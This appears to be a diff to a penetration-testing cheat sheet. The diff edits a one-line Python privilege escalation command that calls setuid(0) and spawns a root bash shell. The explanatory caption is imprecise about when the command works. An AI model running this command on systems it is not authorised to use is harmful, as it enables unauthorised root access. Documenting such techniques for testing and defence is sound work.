@@ -1,7 +1,7 @@
 ##  Privilege Escalation via Python
 
 ```python
-python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
 > Spawns a root shell if the script is run with root privileges.
